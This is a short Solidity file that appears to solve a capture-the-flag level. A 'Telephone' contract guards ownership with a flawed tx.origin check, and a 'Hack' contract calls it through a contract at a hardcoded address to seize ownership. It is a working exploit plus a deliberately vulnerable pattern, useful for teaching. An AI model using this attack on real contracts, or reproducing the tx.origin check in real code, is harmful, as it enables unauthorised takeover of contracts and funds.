// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}

contract Hack {
    Telephone private immutable target =
        Telephone(0xE5CfA21B176E65395F15BE952FF0ccbCaaA03299);

    function changeTargetOwner() external {
        target.changeOwner(msg.sender);
    }
}
